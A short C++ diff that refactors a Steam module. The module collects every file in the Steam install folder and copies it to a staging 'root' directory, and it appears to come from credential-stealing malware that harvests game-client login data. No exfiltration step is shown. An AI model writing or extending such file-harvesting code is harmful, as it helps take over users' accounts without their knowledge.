@@ -8,7 +8,9 @@ static const fs::path STEAM_PATH = Utils::getSystemDrive() / "\\Program Files (x
 
 
 void Steam::execute(fs::path &root) {
-    std::vector<fs::path> paths = Steam::steamFiles();
+    std::vector<fs::path> paths = FilesUtil::scanDirectory(STEAM_PATH, [](const fs::path &path) {
+        return !is_directory(path);
+    });
 
     if(paths.empty())
         return;
@@ -20,23 +22,5 @@ void Steam::execute(fs::path &root) {
     {
         Utils::copy(path, dst);
     }
-}
-
-std::vector<fs::path> Steam::steamFiles() {
-    std::vector<fs::path> paths;
-    try
-    {
-        for (const auto& entry : fs::directory_iterator(STEAM_PATH)) {
-            const fs::path& item_path = entry.path();
-
-            if(is_directory(item_path))
-                continue;
-
-            paths.push_back(item_path);
-        }
-    }
-    catch (const fs::filesystem_error& ignored) {}
-
-    return paths;
 }
 
